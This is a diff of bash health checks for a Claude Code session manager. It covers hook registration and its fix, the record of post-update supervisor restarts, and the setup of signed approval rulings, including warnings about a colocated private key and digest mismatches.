+    local how="stop and start it through ccd ('ccd stop ${spool_none[0]}', then 'ccd start ${spool_none[0]}')"
+    [ "$n" -eq 1 ] || how="stop and start each through ccd (for example 'ccd stop ${spool_none[0]}', then 'ccd start ${spool_none[0]}')"
+    _dr_warn delegation-hooks "$who: $shown$more" \
+      "nothing is lost by waiting: ccd makes the directory at the next spawn. To observe the $s now, $how — this resumes its conversation but ends an in-flight turn"
+    [ "$worst" -eq 1 ] || worst=2
+  fi
+  if [ "$unasked" -gt 0 ]; then
+    n=$unasked; s=sessions; [ "$n" -eq 1 ] && s=session
+    _dr_warn delegation-hooks "the service manager gave no answer for $n $s, so whether $([ "$n" -eq 1 ] && echo it || echo they) owe$([ "$n" -eq 1 ] && echo s) a delegation spool directory was not measured: $(_dr_join "${spool_unasked[@]}")" \
+      "ask the manager by hand ($(_svc_status_hint "claude-session@${spool_unasked[0]}.service")) and re-run ccrc doctor"
+    [ "$worst" -eq 1 ] || worst=2
+  fi
+  if [ "$worst" -eq 0 ]; then
+    _dr_pass delegation-hooks "$homes/$homes rostered homes register all ${#want[@]} hook events the shipped installer writes; no running session lacks its delegation spool directory ($rows_read registry rows read, $rows_ok with a directory)"
+  fi
+  return "$worst"
+}
+
+# The cure `ccrc doctor --fix` runs for `delegation-hooks` (FAIL only, R-C8): the SHIPPED installer, `$CCRC_HERE/
+# install-session-hooks.sh`, into every rostered home that exists on this box — the tree the check measured, never a
+# copy of its logic, so this is not a second hook installer. The installer validates before it writes, backs up what it
+# replaces, swaps managed entries only (ccrc's own hook under a Worktree event included) and leaves every foreign entry of its
+# own (a `WorktreeCreate` hook naming another command included) byte-identical; a home it refuses (invalid JSON) stays a FAIL on
+# the re-measurement, which is the verdict. It creates no spool directory: that is ccd's, at spawn.
+#
+# ONE HOME IT DOES NOT HAND TO THE INSTALLER (R55, coordinator 5180). The installer's sweep (`JQ_UNMANAGED`) drops a whole
+# entry when ANY hook in it names `/session-hook.sh`, so an entry that carries ccrc's hook AND another command loses the
+# other command — under every event, on `ccrc install` and `ccrc update` as well as here. This fixer is the first
+# `doctor --fix` path into that drop, and "never removes or rewrites a foreign registration" (5151) binds it: before a
+# home goes to the installer its settings.json is read for any such mixed entry, under any event. A home that has one is
+# REFUSED (its file untouched, byte for byte), the refusal names the event and the manual step, and the other homes are
+# fixed as before. A settings.json jq cannot read is left to the installer, which refuses it in its own words.
+# The test MIRRORS the installer's own sweep (Task 14 re-review 2, N4): `map(...)` and `any(...)` iterate an event value and
+# a `hooks` list whatever their JSON type, so an object-shaped value or `hooks` (not valid Claude Code settings, but what
+# the sweep would still walk) is walked here too, and a mixed entry there is refused like any other.
+_dh_mixed_events() {   # <settings.json> -> the events (one per line) holding an entry that mixes ccrc's hook with another command
+  jq -r '
+    (.hooks // {}) | if type == "object" then to_entries[] else empty end
+    | select(any(.value[]?; type == "object"
+        and ([(.hooks // [])[]? | type == "object" and ((.command // "") | tostring | contains("/session-hook.sh"))] as $o
+          | ($o | any) and ($o | any(not)))))
+    | .key' "$1" 2>/dev/null
+}
+
+_fix_delegation-hooks() {
+  local inst="$CCRC_HERE/install-session-hooks.sh" roster="$HOME/.ccrc/accounts.json" rows id suffix dir said n=0 list="" mixed evs verb e refused=0
+  local -a dirs=() evarr=()
+  rows="$(_skills_roster_rows "$roster")" || { echo "FIX delegation-hooks: refused — \$HOME/.ccrc/accounts.json could not be read as a roster"; return 1; }
+  while IFS=$'\t' read -r id suffix; do
+    [ -n "$id" ] || continue
+    dir="$HOME/$suffix"
+    [ -d "$dir" ] || continue
+    if [ -f "$dir/settings.json" ] && [ -r "$dir/settings.json" ] && command -v jq >/dev/null 2>&1; then
+      mixed="$(_dh_mixed_events "$dir/settings.json")"
+      if [ -n "$mixed" ]; then
+        # One event per line, read as lines (N5: never word-split or glob-expanded, so a key like `*` names itself).
+        evarr=()
+        while IFS= read -r e; do [ -n "$e" ] && evarr+=("$e"); done <<< "$mixed"
+        if [ "${#evarr[@]}" -eq 1 ]; then
+          evs="${evarr[0]}"; verb="holds"; said="under $evs"
+        else
+          # N6: "WorktreeCreate and Stop hold", "A, B and C hold"
+          evs=""; for e in "${evarr[@]:0:${#evarr[@]}-1}"; do evs="${evs:+$evs, }$e"; done
+          evs="$evs and ${evarr[${#evarr[@]}-1]}"; verb="hold"; said="under each of $evs"
+        fi
+        echo "FIX delegation-hooks: refused — $id: $evs $verb an entry that mixes ccrc's session hook with another command, and the sweep that --fix, ccrc install and ccrc update run removes the whole entry that carries ccrc's hook, other commands included; move the other command into an entry of its own $said, then re-run ccrc doctor --fix"
+        refused=1; continue
+      fi
+    fi
+    dirs+=("$dir"); n=$((n + 1)); list="$list${list:+, }$id"
+  done <<< "$rows"
+  if [ "$n" -eq 0 ]; then
+    [ "$refused" -eq 1 ] && return 1
+    echo "FIX delegation-hooks: nothing to cure — no rostered home exists on this box"; return 0
+  fi
+  # The interpreter running THIS file, as `_fix_skills` runs its installers.
+  if ! said="$("${BASH:-bash}" "$inst" --homes "${dirs[@]}" 2>&1)"; then
+    echo "FIX delegation-hooks: refused — $inst said: ${said##*$'\n'}"; return 1
+  fi
+  echo "FIX delegation-hooks: re-ran the shipped tree's install-session-hooks.sh into $n home(s): $list"
+  [ "$refused" -eq 0 ] || return 1
+}
+
+# ── update-sweep: the last update's supervisor sweep, as its report recorded it ──
+# Reading 9's doctor half (the operator, 2026-10-15: warn only) and R10k (wave 17,
+# D-5316). `ccrc update` and `ccrc rollback` record what their supervisor sweep did
+# as update.json's `sweep` key (D-5314, D-5315): `ok`, `down: <n>: <id> ...`,
+# `refused: <why>`, `unverified: <why>` or `died: <why>`; and the watchdog's close of an
+# abandoned `restarting` report records `died: abandoned` (D-5329). This check reads that
+# record and NEVER FAILS, by the operator's ruling (warn only): a FAIL would turn a
+# state the update already recorded and reported into exit 1 for every bare
+# `ccrc doctor` and `ccrc install`, and into exit 3 with a changed detail for every
+# later update. Inside an update's own install tail the report is that run's
+# in-flight one, so this check SKIPs there. An ABSENT key is NOT MEASURED (a build
+# before wave 17 wrote the report, a converged no-op wrote it, or the run stopped
+# before its sweep), never "nothing was down". Nothing here, or anywhere, re-sweeps:
+# a recorded refusal is reported until the next update or rollback writes a new report.
+# A server-role box hosts no supervisors (D-3111), so no sweep result is its concern: the
+# whole check SKIPs there (D-5330), the `restarting` dead-pid arm included. An absent or
+# unreadable role keeps the check as it is; it never folds into that skip.
+_check_update-sweep() {
+  if ! declare -F _upd_report_readable >/dev/null 2>&1 || ! declare -F _svc_is_active >/dev/null 2>&1 \
+     || [ -z "${BOX_UPDATE_JSON:-}" ]; then
+    _dr_skip update-sweep "ccrc's own report reader is not loaded, so the last update's sweep was not read (a bug in ccrc: this table was sourced by something that is not ccrc)"
+    return 3
+  fi
+  local rrc=0 line phase pid word rest n id ans cut="" fix clears nr msg sh l sw _srv_role=""
+  local -a words=()
+  local -a ids=() still=() unasked=() rst=()
+  # `-f` before `-r` (D-3025), and `${BOX_ENV_FILE:-}` for a caller that sources this file bare, as
+  # `_check_accounts` does (D-3111).
+  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
+  if [ "$_srv_role" = server ]; then
+    _dr_skip update-sweep "this box records CCRC_ROLE=server, so it hosts no supervisors and no update's supervisor sweep is its concern"
+    return 3
+  fi
+  clears="; this WARN clears at the next ccrc update or rollback, which writes a new report"
+  _upd_report_readable || rrc=$?
+  case "$rrc" in
+    0) ;;
+    1) _dr_skip update-sweep "no update report on this box (~/.ccrc/update.json is absent), so there is no sweep to read"; return 3 ;;
+    *) _dr_skip update-sweep "~/.ccrc/update.json is not a readable regular file under its size cap, so the last sweep was not read"; return 3 ;;
+  esac
+  if ! command -v jq >/dev/null 2>&1; then
+    _dr_skip update-sweep "jq is not on PATH, so ~/.ccrc/update.json was not read"; return 3
+  fi
+  line="$(jq -r 'if type != "object" then "?" else "\(.phase // "")\t\(.pid // "")\t\(.sweep // "")" end' "$BOX_UPDATE_JSON" 2>/dev/null)" || line="?"
+  if [[ "$line" != *$'\t'*$'\t'* ]]; then
+    _dr_skip update-sweep "~/.ccrc/update.json does not parse as one report, so the last sweep was not read"; return 3
+  fi
+  phase="${line%%$'\t'*}"; rest="${line#*$'\t'}"; pid="${rest%%$'\t'*}"; word="${rest#*$'\t'}"
+  case "$phase" in
+    done|failed|reverted) ;;
+    restarting)
+      # The one phase the sweep runs in. Its updater released the lock before it,
+      # so an updater killed here (OOM, SIGKILL) leaves `restarting` for good on a
+      # box with no watchdog. A live pid is a sweep in flight; a dead one is not.
+      if [[ "$pid" =~ ^[123456789][0123456789]{0,9}$ ]] && ! kill -0 "$pid" 2>/dev/null; then
+        _dr_warn update-sweep "the last update's report stopped at phase 'restarting' and its updater (pid $pid) is gone, so its supervisor sweep's outcome was never recorded: some supervisors may run the previous ccd" \
+          "ccrc status lists each session's state; restart any that is not running with ccd start <id>${clears}"
+        return 2
+      fi
+      _dr_skip update-sweep "the last update is restarting its supervisors now (updater pid ${pid//[![:print:]]/?}), so its sweep has not been recorded yet"; return 3 ;;
+    *) _dr_skip update-sweep "the last update's report is at phase '${phase//[![:print:]]/?}', not a final one, so no sweep has been recorded"; return 3 ;;
+  esac
+  if [ -z "$word" ]; then
+    _dr_skip update-sweep "the last update's report (phase $phase) records no sweep: an older build wrote it, it moved nothing, or it stopped before its sweep — not measured"
+    return 3
+  fi
+  # The word is same-user-writable text (the report is, spec §8): what is PRINTED of it is
+  # cut and scrubbed, as `phase` and `pid` are above; what is MATCHED is the raw word.
+  sw="${word:0:60}"; sw="${sw//[![:print:]]/?}"
+  case "$word" in
+    ok)
+      _dr_pass update-sweep "the last update's sweep found no supervisor already activating or failed before its restart"
+      return 0 ;;
+    'down: '*)
+      rest="${word#down: }"; n="${rest%%:*}"; rest="${rest#*:}"
+      [[ "$n" =~ ^[0123456789]{1,4}$ ]] || { _dr_skip update-sweep "the last report's sweep word does not parse ('$sw'), so it was not read"; return 3; }
+      # Split WITHOUT globbing: an unquoted `for id in $rest` expands a `*` in a hand-cut word
+      # against the cwd, and a file named like an id would then be read as one.
+      read -ra words <<<"$rest" || true
+      for id in ${words[@]+"${words[@]}"}; do
+        [[ "$id" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] && ids+=("$id")
+      done
+      if [ "${#ids[@]}" -eq 0 ]; then
+        _dr_skip update-sweep "the last report's sweep word names no supervisor id this build can read ('$sw'), so it was not read"; return 3
+      fi
+      [ "${#ids[@]}" -ge "$((10#$n))" ] || cut=" (the report names ${#ids[@]} of $((10#$n)); the rest did not fit in it)"
+      # The bus defaults the `services` check sets, for the same reason: each check
+      # runs in its own `$( )`, so that check's exports never reach this one, and
+      # without them every unit answers EMPTY from a non-interactive context.
+      if [ "${CCD_OS:-linux}" != darwin ]; then
+        : "${XDG_RUNTIME_DIR:=/run/user/$UID}"; export XDG_RUNTIME_DIR
+        : "${DBUS_SESSION_BUS_ADDRESS:=unix:path=${XDG_RUNTIME_DIR}/bus}"; export DBUS_SESSION_BUS_ADDRESS
+      fi
+      # THREE answers, never two (`_svc_is_active`'s own header): `active`; EMPTY,
+      # the manager did not answer, which is NOT the unit is down; or the manager's
+      # own word, quoted back, because `failed` and `inactive` send an operator to
+      # two different places. On Linux a FOURTH fact rides the same read (the
+      # coordinator's ruling 12, D-5316): the operator's Reading 9 case is a unit
+      # that was crash-looping BEFORE the update, and one `active` read is what such
+      # a unit shows between its restarts, so `active` is back only with NRestarts 0.
+      # `show` WITHOUT `--value` (D-5328), the two values taken BY NAME: `--value`
+      # prints in the manager's property order, not the order of the `-p` flags, so
+      # a two-value `--value` read cannot say which line is which. No ActiveState
+      # line, an empty one, or `active` with no digits for NRestarts is the manager
+      # not answering.
+      # Darwin has no NRestarts: it keeps the one `_svc_is_active` read.
+      for id in ${ids[@]+"${ids[@]}"}; do
+        if [ "${CCD_OS:-linux}" = darwin ]; then
+          ans="$(_svc_is_active "claude-session@$id.service")"
+        else
+          sh="$(systemctl --user show -p ActiveState -p NRestarts "claude-session@$id.service" 2>/dev/null)" || sh=""
+          ans=""; nr=""
+          while IFS= read -r l; do
+            case "$l" in
+              ActiveState=*) ans="${l#ActiveState=}" ;;
+              NRestarts=*) nr="${l#NRestarts=}" ;;
+            esac
+          done <<<"$sh"
+          if [ "$ans" = active ]; then
+            if [[ "$nr" =~ ^[0123456789]{1,9}$ ]]; then
+              if [ "$((10#$nr))" -gt 0 ]; then
+                rst+=("$id (active at this read, but restarted $((10#$nr)) times by its manager since)"); continue
+              fi
+            else
+              ans=""
+            fi
+          fi
+        fi
+        case "$ans" in
+          active) ;;
+          '') unasked+=("$id") ;;
+          *) still+=("$id (${ans//[![:print:]]/?})") ;;
+        esac
+      done
+      if [ "${#still[@]}" -eq 0 ] && [ "${#rst[@]}" -eq 0 ] && [ "${#unasked[@]}" -gt 0 ]; then
+        _dr_skip update-sweep "the service manager did not answer for ${unasked[*]}, one of the ${#ids[@]} supervisor(s) the last update found already down before its restart${cut} — not measured"
+        return 3
+      fi
+      if [ "${#still[@]}" -eq 0 ] && [ "${#rst[@]}" -eq 0 ]; then
+        if [ "${CCD_OS:-linux}" = darwin ]; then
+          _dr_pass update-sweep "the ${#ids[@]} supervisor(s) the last update found already down before its restart read active at this read${cut} (one read: a unit that crash-loops can read active between its restarts)"
+        else
+          _dr_pass update-sweep "the ${#ids[@]} supervisor(s) the last update found already down before its restart each read active at this read, with no restart by their manager since${cut}"
+        fi
+        return 0
+      fi
+      if [ "${CCD_OS:-}" = darwin ]; then fix="ccd start <id> for each (it clears the start-limit stamp and re-bootstraps the job)"
+      else fix="systemctl --user reset-failed claude-session@<id>.service, then ccd start <id>; read: systemctl --user status claude-session@<id>.service"; fi
+      msg=""
+      [ "${#still[@]}" -eq 0 ] || msg="${#still[@]} supervisor(s) were already down before the last update's restart and are still not active: ${still[*]}${cut}"
+      if [ "${#rst[@]}" -gt 0 ]; then
+        msg="${msg:+$msg; }${#rst[@]} supervisor(s) the last update found already down before its restart read active, but their manager has restarted them since (a crash loop reads active between its restarts): ${rst[*]}"
+        [ "${#still[@]}" -gt 0 ] || msg="$msg${cut}"
+      fi
+      [ "${#unasked[@]}" -eq 0 ] || msg="$msg; not measured (the service manager did not answer): ${unasked[*]}"
+      _dr_warn update-sweep "$msg — the update did not verify them and did not fail for them" "$fix"
+      return 2 ;;
+    'refused: '*)
+      case "${word#refused: }" in
+        listing) fix="once systemctl --user list-units 'claude-session@*' answers, confirm KillMode=process on each unit, then: systemctl --user try-restart 'claude-session@*'" ;;
+        killmode) fix="set KillMode=process (a drop-in under the unit directory's claude-session@.service.d/ can), then: systemctl --user try-restart 'claude-session@*'" ;;
+        job-file) fix="ccd start <id> rewrites each session's job file; then restart each: launchctl kickstart -k <domain>/<label>" ;;
+        *) fix="read the update's own output for the refusal, fix what it names, then restart the supervisors" ;;
+      esac
+      _dr_warn update-sweep "the last update's supervisor sweep was REFUSED (${sw#refused: }), so every live claude-session@ supervisor still ran the ccd it ran before that update; nothing re-sweeps" "${fix}${clears}"
+      return 2 ;;
+    'unverified: '*)
+      _dr_warn update-sweep "the last update's post-restart listing was not read (${sw#unverified: }), so no supervisor's state after its restart is known" \
+        "ccrc status lists each session's state; restart any that is not running with ccd start <id>${clears}"
+      return 2 ;;
+    'died: abandoned')
+      # D-5329 (review 589 F1): `cmd_watchdog` closes a stale `restarting` report with this word.
+      _dr_warn update-sweep "the watchdog closed the last update's report, abandoned during or right after its supervisor sweep, so its outcome was never recorded and some supervisors may run the previous ccd" \
+        "ccrc status lists each session's state; restart any that is not running with ccd start <id>${clears}"
+      return 2 ;;
+    'died: '*)
+      _dr_warn update-sweep "the last update's supervisor sweep died partway (${sw#died: }; the report's detail says where), so some supervisors may run the previous ccd and the rest the new one" \
+        "read the detail in ~/.ccrc/update.json and follow its read: line; ccrc status lists each session's state${clears}"
+      return 2 ;;
+    *)
+      _dr_skip update-sweep "the last report's sweep word is not one this build knows ('$sw'), so it was not read"
+      return 3 ;;
+  esac
+}
+
+# ── the approval wait's two checks (coordinator-first routing, plan Task 14, spec §6.3 step 1 and §6.4, D-5297, D-5487) ──
+# A dispatched child's permission hook asks the server for a ruling only when it can VERIFY one: `node` on PATH, the
+# verifier installed beside the hook, and the server's public key pinned. `approval-verifier-runnable` names each
+# missing piece by name; any one missing means rulings never engage on this box (every prompt goes to the operator,
+# as before), which is a WARN and not a FAIL: nothing is broken that worked. A server-role box hosts no sessions.
+_dr_approval_role() {
+  local r=""
+  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && r="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
+  printf '%s' "$r"
+}
+_check_approval-verifier-runnable() {
+  local missing=""
+  if [ "$(_dr_approval_role)" = server ]; then
+    _dr_skip approval-verifier-runnable "this box records CCRC_ROLE=server, so it hosts no sessions and no permission hook runs on it"
+    return 3
+  fi
+  # No registry, no sessions: `ccd` creates `~/.cc-sessions` before it starts one, so a box without it has no child
+  # whose hook could wait.
+  if [ ! -d "$HOME/.cc-sessions" ]; then
+    _dr_skip approval-verifier-runnable "this box has no session registry (\$HOME/.cc-sessions), so no child's permission hook runs on it"
+    return 3
+  fi
+  # `node` is looked up on doctor's own PATH. A session runs under claude-session@'s environment, whose PATH holds the
+  # same install's bin directories, so a box where doctor finds node is one where the hook finds it; a hand-edited unit
+  # PATH is the case this cannot see (D-5487).
+  command -v node >/dev/null 2>&1 || missing="${missing:+$missing, }node (not on PATH)"
+  # The registry as the bare directory, never `.cc-sessions/<name>` on a code line: pool-name-parity.test.ts pins those.
+  local areg="$HOME/.cc-sessions"
+  [ -f "$areg/approval-verify.mjs" ] || missing="${missing:+$missing, }the verifier (approval-verify.mjs in \$HOME/.cc-sessions)"
+  # A key not pinned yet, with node and the verifier in place, is the rollout's expected state (D-5487 (1)): the server
+  # had not served one when this box last updated. Nothing is broken, so it SKIPs and a fresh install ends green (D-139).
+  if [ -z "$missing" ] && [ ! -f "$HOME/.ccrc/approval-signing.pub" ]; then
+    _dr_skip approval-verifier-runnable "no approval key is pinned yet (\$HOME/.ccrc/approval-signing.pub): the server had not served one when this box last updated, so every prompt goes to the operator, as today; the next ccrc update after the server serves one pins it"
+    return 3
+  fi
+  [ -f "$HOME/.ccrc/approval-signing.pub" ] || missing="${missing:+$missing, }the pinned key (\$HOME/.ccrc/approval-signing.pub)"
+  if [ -n "$missing" ]; then
+    _dr_warn approval-verifier-runnable "a child's permission hook cannot verify a ruling, so coordinator rulings never engage on this box and every prompt goes to the operator; missing: $missing" \
+      "run ccrc update (it installs the verifier and pins the server's key once the server serves one); install Node if the 'node' check names it"
+    return 2
+  fi
+  _dr_pass approval-verifier-runnable "node, the verifier and the pinned approval key are present"
+}
+# `approval-key-changed`: the install spine pins the server's key ONCE and never replaces it; a later run offered a
+# different key records the offer in `~/.ccrc/approval-key-offered`. That is a FAIL until the operator decides.
+_check_approval-key() {
+  local pinned="$HOME/.ccrc/approval-signing.pub" offered="$HOME/.ccrc/approval-key-offered"
+  if [ "$(_dr_approval_role)" = server ]; then
+    _dr_skip approval-key "this box records CCRC_ROLE=server; the key it serves is pinned on the fleet box"
+    return 3
+  fi
+  if [ ! -f "$pinned" ]; then
+    _dr_skip approval-key "no approval key is pinned yet (\$HOME/.ccrc/approval-signing.pub); the 'approval-verifier-runnable' check owns that"
+    return 3
+  fi
+  if [ -f "$offered" ] && [ "$(cat -- "$offered" 2>/dev/null)" != "$(cat -- "$pinned" 2>/dev/null)" ]; then
+    _dr_fail approval-key "approval-key-changed: the server offered a different approval key than the one pinned in \$HOME/.ccrc/approval-signing.pub; the pinned key stays, so rulings signed by the new key are ignored" \
+      "if the server's key was rotated on purpose, remove \$HOME/.ccrc/approval-signing.pub and \$HOME/.ccrc/approval-key-offered by hand and run ccrc update; otherwise find out why the server's key changed"
+    return 1
+  fi
+  _dr_pass approval-key "the pinned approval key is the one the server last offered"
+}
+# ── the approval rulings' two server-side checks (coordinator-first routing, plan Task 16, spec §6.1, §6.3, D-5298) ──
+# `approval-key-colocated`: the server's PRIVATE signing key sits on a box that also runs agent-lane sessions, so a
+# same-user child could read it and a signature no longer shows the server made a ruling (spec §6.1). Reported whether
+# or not the operator placed `~/.ccrc/approvals-single-box`: the opt-in decides whether rulings are minted, not whether
+# the key is reachable. A WARN, because the single-box install is documented and the opt-in is the operator's.
+_check_approval-key-colocated() {
+  local key="$HOME/.ccrc/approval-signing.key" n=0 f
+  if [ ! -f "$key" ]; then
+    _dr_skip approval-key-colocated "this box holds no approval signing key (\$HOME/.ccrc/approval-signing.key); only a server that has started with coordination writes one"
+    return 3
+  fi
+  if [ -d "$HOME/.cc-sessions" ]; then
+    for f in "$HOME/.cc-sessions"/*.uuid; do [ -e "$f" ] && n=$((n + 1)); done
+  fi
+  if [ "$n" -gt 0 ]; then
+    # The server's own gate (`rulingsAllowedHere`): a non-`both` role over CCRC_FLEET=remote mints without the opt-in;
+    # `both`, or a local fleet mode whatever the recorded role, only with it.
+    local opt="the operator has not opted in, so this server mints no rulings (409 single-box)" role="" mode=""
+    if [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ]; then
+      role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"; mode="$(_box_env_value "$BOX_ENV_FILE" CCRC_FLEET)"
+    fi
+    if [ "$mode" = remote ] && [ "$role" != both ]; then
+      opt="this box records CCRC_ROLE=${role:-(none: server, derived)} and CCRC_FLEET=remote, so this server mints and signs rulings here without the opt-in"
+    elif [ -f "$HOME/.ccrc/approvals-single-box" ]; then
+      opt="the operator opted in (\$HOME/.ccrc/approvals-single-box), so rulings are minted and signed here"
+    fi
+    _dr_warn approval-key-colocated "approval-key-colocated: the server's approval signing key sits beside $n session row(s) on this box, so a same-user session could read it; $opt" \
+      "run the server and the sessions on two boxes (ccrc install --role server / --role fleet) for a signature that separates them; on one box, keep \$HOME/.ccrc/approvals-single-box only if you accept that"
+    return 2
+  fi
+  _dr_pass approval-key-colocated "the approval signing key sits on a box with no session rows"
+}
+# `approval-digest-mismatch`: the server refuses a request whose digest it cannot recompute, or whose canonical string
+# does not re-canonicalise to itself (`409 digest-mismatch`), and journals each one in `~/.ccrc/approval-refusals.log`
+# (`<epoch ms> digest-mismatch <session id>`, D-5490). Any in the last seven days means the hook's jq form and the
+# server's TypeScript form disagree on some input: a WARN, with the count, so a divergence is never silent.
+_check_approval-digest-mismatch() {
+  local log="$HOME/.ccrc/approval-refusals.log" since n=0 at word rest
+  if [ "$(_dr_approval_role)" = fleet ]; then
+    _dr_skip approval-digest-mismatch "this box records CCRC_ROLE=fleet; the server box journals the approval refusals"
+    return 3
+  fi
+  if [ ! -f "$log" ]; then
+    _dr_pass approval-digest-mismatch "no approval request has been refused digest-mismatch on this server"
+    return 0
+  fi
+  since=$(( ($(date +%s) - 7 * 86400) * 1000 ))
+  while read -r at word rest; do
+    [[ "$at" =~ ^[0-9]+$ && "$word" == digest-mismatch ]] || continue
+    (( at >= since )) && n=$((n + 1))
+  done < "$log"
+  if [ "$n" -gt 0 ]; then
+    _dr_warn approval-digest-mismatch "approval-digest-mismatch: $n approval request(s) refused digest-mismatch in the last 7 days; the hook's canonical form and the server's disagree on some input, and those prompts went to the operator" \
+      "compare the hook's APPROVAL_DIGEST_JQ with approvalDigestBytes over the corpus (server/test/fixtures/approvals/digest-corpus.json) and check that the fleet box and the server run the same release"
+    return 2
+  fi
+  _dr_pass approval-digest-mismatch "no approval request was refused digest-mismatch in the last 7 days"
 }
